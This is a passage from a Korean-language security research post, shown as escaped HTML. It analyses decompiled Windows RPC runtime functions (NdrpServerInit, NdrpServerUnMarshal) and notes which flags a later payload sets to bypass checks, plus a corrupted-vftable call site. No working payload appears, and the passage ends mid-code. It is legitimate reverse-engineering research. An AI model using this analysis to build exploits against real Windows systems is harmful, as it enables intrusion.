  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    StubMsg-&amp;gt;FullPtrXlatTables = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
  StubMsg-&amp;gt;_bf_c0 |= &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;u;
  StubMsg-&amp;gt;StackTop = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)StartOfStack;
  StubMsg-&amp;gt;pUserMarshalList = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (Context-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt;.NdrInfo.InterpreterFlags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
    NdrRpcSsEnableAllocate(StubMsg);
  ProcDesc2 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)Context-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt;.NdrInfo.pProcDesc;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (ProcDesc2[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )&lt;span class=&#34;hljs-comment&#34;&gt;//Flags&lt;/span&gt;
  {
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; ProcDesc2;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ProcDesc&amp;#xC758; &amp;#xD50C;&amp;#xB798;&amp;#xADF8;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C; &amp;#xBD84;&amp;#xAE30;&amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC774; &amp;#xB9CE;&amp;#xC740; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294;&amp;#xB370;&amp;#xC694;?  if&amp;#xB85C; ProcDesc&amp;#xC758; &amp;#xD50C;&amp;#xB798;&amp;#xADF8;&amp;#xB97C; &amp;#xBE44;&amp;#xAD50;&amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xBCF4;&amp;#xBA74; &lt;code&gt;NdrpPipesInitialize&lt;/code&gt;&amp;#xB098; &lt;code&gt;NdrServerInitializePartial&lt;/code&gt; &amp;#xB4F1; &amp;#xCD94;&amp;#xAC00;&amp;#xC801;&amp;#xC778; &amp;#xD638;&amp;#xCD9C;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB4E4;&amp;#xC740; &amp;#xAD73;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xD560; &amp;#xD544;&amp;#xC694;&amp;#xAC00; &amp;#xC5C6;&amp;#xC5B4; &amp;#xBCF4;&amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xB4A4;&amp;#xC5D0; &amp;#xB098;&amp;#xC62C; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &amp;#xC774;&amp;#xB97C; &amp;#xAC74;&amp;#xB108;&amp;#xB6F8; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &amp;#xD50C;&amp;#xB798;&amp;#xADF8;&amp;#xB97C; &amp;#xC124;&amp;#xC815;&amp;#xD574;&amp;#xC92C;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &lt;code&gt;StubMsg&lt;/code&gt;&amp;#xB97C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD2B9;&amp;#xD788; &lt;code&gt;RpcMsg&lt;/code&gt;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xB41C; &amp;#xC778;&amp;#xC790;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xBC84;&amp;#xD37C;&amp;#xC758; &amp;#xC2DC;&amp;#xC791;&amp;#xACFC; &amp;#xB05D;&amp;#xC774; &lt;code&gt;pStubMsg&lt;/code&gt;&amp;#xC758; &lt;code&gt;Buffer&lt;/code&gt;, &lt;code&gt;BufferStart&lt;/code&gt;&amp;#xC640; &lt;code&gt;BufferEnd&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5C8;&amp;#xB124;&amp;#xC694;. &amp;#xC774;&amp;#xD6C4; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xB41C; &lt;code&gt;StubMsg&lt;/code&gt;&amp;#xB85C; &lt;code&gt;NdrpServerUnMarshal&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;h3 id=&#34;Argument-Parsing-NdrpServerUnMarshal&#34;&gt;&lt;a href=&#34;#Argument-Parsing-NdrpServerUnMarshal&#34; class=&#34;headerlink&#34; title=&#34;Argument Parsing(NdrpServerUnMarshal)&#34;&gt;&lt;/a&gt;Argument Parsing(&lt;code&gt;NdrpServerUnMarshal&lt;/code&gt;)&lt;/h3&gt;&lt;p&gt;&amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC774; &amp;#xC720;&amp;#xC77C;&amp;#xD55C; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &lt;code&gt;NdrpServerInit&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xB41C; &lt;code&gt;StubMsg&lt;/code&gt;&amp;#xB97C; &amp;#xC804;&amp;#xB2EC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;NdrpServerUnMarshal(&amp;amp;pStubMsg);&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __fastcall &lt;span class=&#34;hljs-title&#34;&gt;NdrpServerUnMarshal&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(struct _MIDL_STUB_MESSAGE *pStubMsg1)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  pContext1 = pStubMsg1-&amp;gt;pContext;
  v3 = pContext1-&amp;gt;DceTypeFormatString;
  isDataRep0x10 = LOWORD(pStubMsg1-&amp;gt;RpcMsg-&amp;gt;DataRepresentation) == &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;;
  Params = (__int16 *)pContext1-&amp;gt;Params;
  v64 = v3;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !isDataRep0x10 )
  {
    NdrConvert2(pStubMsg1, (PFORMAT_STRING)Params, pContext1-&amp;gt;NumberParams);
    v3 = v64;
  }
  v6 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
  i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pContext1-&amp;gt;NumberParams )
  {
    v8 = &lt;span class=&#34;hljs-number&#34;&gt;0x2000&lt;/span&gt;i64;
    &lt;span class=&#34;hljs-keyword&#34;&gt;do&lt;/span&gt;
    {
      flag = Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i];                     &lt;span class=&#34;hljs-comment&#34;&gt;// Param + i*3 (0,6,9,12...)&lt;/span&gt;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (flag &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xC&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; )
      {
        StackIndex = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16)Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;];&lt;span class=&#34;hljs-comment&#34;&gt;// Params + i*3 + 1 (1,7,10,13...)&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (flag &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x800&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
        {
          StackBufferPointer = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)&amp;amp;pContext1-&amp;gt;StartofStack[StackIndex];
          v47 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64)(pStubMsg1-&amp;gt;Buffer + &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;);
          v65 = StackBufferPointer;
          v47 &amp;amp;= &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFFFFFFFFFFC&lt;/span&gt;ui64;        &lt;span class=&#34;hljs-comment&#34;&gt;// align&lt;/span&gt;
          pStubMsg1-&amp;gt;Buffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)v47;
          *(_QWORD *)StackBufferPointer = *(_DWORD *)v47 != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
          pStubMsg1-&amp;gt;Buffer += &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
        }
        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
        {
          StackBufferPointer1 = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)&amp;amp;pContext1-&amp;gt;StartofStack[StackIndex];
          v65 = StackBufferPointer1;
          flag2 = Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i];
          &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (flag2 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
          {
            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (flag2 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
            {
              &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( LOBYTE(Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;]) == &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; )
              {
LABEL_34:
                v28 = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)((&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64)(pStubMsg1-&amp;gt;Buffer + &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFFFFFFFFFFC&lt;/span&gt;ui64);&lt;span class=&#34;hljs-comment&#34;&gt;// align 0x4&lt;/span&gt;
                pStubMsg1-&amp;gt;Buffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)v28;&lt;span class=&#34;hljs-comment&#34;&gt;// align Buffer&lt;/span&gt;
                ParamValue = *v28;
LABEL_35:
                *(_QWORD *)StackBufferPointer1 = ParamValue;&lt;span class=&#34;hljs-comment&#34;&gt;// Copy data from my RPC_MESSAGE buffer to NDR_PROC_CONTEXT.AllocateContext.PreAllocateBlock(Real Buffer used calling Invoke)&lt;/span&gt;
LABEL_36:
                pStubMsg1-&amp;gt;Buffer += &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
              }
              &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
              {
               ...
              }
              &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pStubMsg1-&amp;gt;Buffer &amp;gt; pStubMsg1-&amp;gt;BufferEnd )
                RpcRaiseException(&lt;span class=&#34;hljs-number&#34;&gt;1783&lt;/span&gt;);
              &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_23;
            }
            v34 = *((&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)&amp;amp;_ImageBase + LOBYTE(Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;]) + &lt;span class=&#34;hljs-number&#34;&gt;0xEDB20&lt;/span&gt;);
            v35 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)(~v34 &amp;amp; (__int64)&amp;amp;pStubMsg1-&amp;gt;Buffer[v34]);
            pStubMsg1-&amp;gt;Buffer = v35;
            v36 = Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;];
            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v36 == &lt;span class=&#34;hljs-number&#34;&gt;-72&lt;/span&gt; || v36 == &lt;span class=&#34;hljs-number&#34;&gt;-71&lt;/span&gt; )
            {
              &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pContext1-&amp;gt;AllocateContext.BytesRemaining &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;ui64 )
              {
                v48 = (_LIST_ENTRY *)I_RpcBCacheAllocate(&lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;ui64);
                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v48 )
                  RpcRaiseException(&lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt;);
                v49 = &amp;amp;pContext1-&amp;gt;AllocateContext.MemoryList;
                v50 = pContext1-&amp;gt;AllocateContext.MemoryList.Flink;
                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v50-&amp;gt;Blink != &amp;amp;pContext1-&amp;gt;AllocateContext.MemoryList )
                  __fastfail(&lt;span class=&#34;hljs-number&#34;&gt;3u&lt;/span&gt;);
                v48-&amp;gt;Flink = v50;
                v8 = &lt;span class=&#34;hljs-number&#34;&gt;0x2000&lt;/span&gt;i64;
                v48-&amp;gt;Blink = v49;
                v50-&amp;gt;Blink = v48;
                v49-&amp;gt;Flink = v48;
                pContext1-&amp;gt;AllocateContext.pBlockPointer = (__int64)&amp;amp;v48[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;];
                pContext1-&amp;gt;AllocateContext.BytesRemaining = &lt;span class=&#34;hljs-number&#34;&gt;4080&lt;/span&gt;i64;
              }
              pContext1-&amp;gt;AllocateContext.BytesRemaining -= &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;i64;
              v51 = (_QWORD *)pContext1-&amp;gt;AllocateContext.pBlockPointer;
              v3 = v64;
              pContext1-&amp;gt;AllocateContext.pBlockPointer = (__int64)(v51 + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;);
              *(_QWORD *)v65 = v51;
              v52 = pStubMsg1-&amp;gt;Buffer;
              &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( LOBYTE(Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;]) == &lt;span class=&#34;hljs-number&#34;&gt;0xB8&lt;/span&gt; )
                *v51 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)v52;
              &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
                **(_QWORD **)v65 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)v52;
              pStubMsg1-&amp;gt;Buffer += &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
              &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_23;
            }
            *(_QWORD *)StackBufferPointer1 = v35;
            pStubMsg1-&amp;gt;Buffer += *((&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)&amp;amp;_ImageBase + LOBYTE(Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;]) + &lt;span class=&#34;hljs-number&#34;&gt;973408&lt;/span&gt;);
            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pStubMsg1-&amp;gt;Buffer &amp;gt; pStubMsg1-&amp;gt;BufferEnd )
              RpcRaiseException(&lt;span class=&#34;hljs-number&#34;&gt;1783&lt;/span&gt;);
          }
          &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
          {
            ...
          }
          v3 = v64;
        }
      }
LABEL_23:
      ++i;
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; ( i &amp;lt; pContext1-&amp;gt;NumberParams );
  }
  v21 = pStubMsg1-&amp;gt;pCorrInfo;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v21 )&lt;span class=&#34;hljs-comment&#34;&gt;//NULL&lt;/span&gt;
  {
	  ...
  }
  v22 = pStubMsg1-&amp;gt;Buffer;
  v23 = pStubMsg1-&amp;gt;BufferEnd;
  v24 = pStubMsg1-&amp;gt;RpcMsg;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v22 + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; &amp;lt; v23 )
  {
    ...
  }
LABEL_26:
  v25 = pStubMsg1-&amp;gt;RpcMsg;
  v26 = (LRPC_SCALL *)pStubMsg1-&amp;gt;RpcMsg-&amp;gt;Handle;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v26 )&lt;span class=&#34;hljs-comment&#34;&gt;//corrupted vftable&lt;/span&gt;
  {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (pStubMsg1-&amp;gt;pContext-&amp;gt;Flags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
    {
      LODWORD(v25) = (*((__int64 (__fastcall **)(struct _MIDL_STUB_MESSAGE *))pNdrOleExtensionsTable + &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;))(pStubMsg1);
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
      v27 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; (__fastcall **)(LRPC_SCALL *, &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;))(*(_QWORD *)v26 + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;i64);
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v27 == LRPC_SCALL::CleanupSystemHandles )
        LODWORD(v25) = LRPC_SCALL::CleanupSystemHandles(v26, &lt;span class=&#34;hljs-number&#34;&gt;5u&lt;/span&gt;);
      &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
        LODWORD(v25) = v27(v26, &lt;span class=&#34;hljs-number&#34;&gt;5u&lt;/span&gt;);&lt;span class=&#34;hljs-comment&#34;&gt;//call function of vftable+0x100&lt;/span&gt;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (_DWORD)v25 )&lt;span class=&#34;hljs-comment&#34;&gt;//if return value is not 0&lt;/span&gt;
        RpcRaiseException(&lt;span class=&#34;hljs-number&#34;&gt;1783&lt;/span&gt;);&lt;span class=&#34;hljs-comment&#34;&gt;//Exception :(&lt;/span&gt;
    }
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v25;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;RpcMsg&lt;/code&gt;&amp;#xC758; &lt;code&gt;DataRepresentation&lt;/code&gt;&amp;#xC774; 0x10&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xBA74; &lt;code&gt;NdrConvert2&lt;/code&gt;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294;&amp;#xB370; &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xB3C4; &amp;#xAC74;&amp;#xB108;&amp;#xB6F8; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &amp;#xC774;&amp;#xD6C4; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C; &amp;#xC124;&amp;#xC815;&amp;#xD574;&amp;#xC90D;&amp;#xC2DC;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xBD84;&amp;#xC11D;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; ProcString&amp;#xC73C;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xB41C; Param&amp;#xC744; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &lt;code&gt;pContext-&amp;gt;Params&lt;/code&gt;&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xCC38;&amp;#xACE0;&amp;#xD574;&amp;#xC11C; &lt;code&gt;pStubMsg-&amp;gt;Buffer&lt;/code&gt;&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &lt;code&gt;RpcMsg-&amp;gt;Buffer&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD574;&amp;#xC11C; &lt;code&gt;NdrStubCall2&lt;/code&gt;&amp;#xC758; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC73C;&amp;#xB85C; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. Params&amp;#xB97C; &amp;#xBD84;&amp;#xC11D;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; 2&amp;#xBC14;&amp;#xC774;&amp;#xD2B8; &amp;#xD544;&amp;#xB4DC; &amp;#xC138; &amp;#xAC1C;&amp;#xB85C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC838; &amp;#xC788;&amp;#xACE0; &amp;#xAC01;&amp;#xAC01; Flag, &amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0;&amp;#xC11C;&amp;#xC758; &amp;#xC778;&amp;#xB371;&amp;#xC2A4;, &amp;#xC778;&amp;#xC790;&amp;#xC758; &amp;#xD06C;&amp;#xAE30;(?)&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; &amp;#xBCF4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;Flag &amp;#xAC12;&amp;#xACFC; &amp;#xC778;&amp;#xC790;&amp;#xC758; &amp;#xD06C;&amp;#xAE30;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C; &amp;#xB2E4;&amp;#xB978; &amp;#xB3D9;&amp;#xC791;&amp;#xC774; &amp;#xC218;&amp;#xD589;&amp;#xB418;&amp;#xB294;&amp;#xB370; Flag&amp;#xAC00; 0x48&amp;#xC77C; &amp;#xB54C;&amp;#xC758; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xBCF4;&amp;#xC2DC;&amp;#xC8E0;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (flag &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xC&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; )
      {
        StackIndex = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16)Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;];&lt;span class=&#34;hljs-comment&#34;&gt;// Params + i*3 + 1 (1,7,10,13...)&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (flag &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x800&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
        {
          ...
        }
        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
        {
          StackBufferPointer1 = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)&amp;amp;pContext1-&amp;gt;StartofStack[StackIndex];
          v65 = StackBufferPointer1;
          flag2 = Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i];
          &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (flag2 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
          {
            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (flag2 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
            {
              &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( LOBYTE(Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;]) == &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; )
              {
LABEL_34:
                v28 = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)((&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64)(pStubMsg1-&amp;gt;Buffer + &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFFFFFFFFFFC&lt;/span&gt;ui64);&lt;span class=&#34;hljs-comment&#34;&gt;// align 0x4&lt;/span&gt;
                pStubMsg1-&amp;gt;Buffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)v28;&lt;span class=&#34;hljs-comment&#34;&gt;// align Buffer&lt;/span&gt;
                ParamValue = *v28;
LABEL_35:
                *(_QWORD *)StackBufferPointer1 = ParamValue;&lt;span class=&#34;hljs-comment&#34;&gt;// Copy data from my RPC_MESSAGE buffer to NDR_PROC_CONTEXT.AllocateContext.PreAllocateBlock(Real Buffer used calling Invoke)&lt;/span&gt;
LABEL_36:
                pStubMsg1-&amp;gt;Buffer += &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;&lt;/code&gt;&lt;/pre&gt;
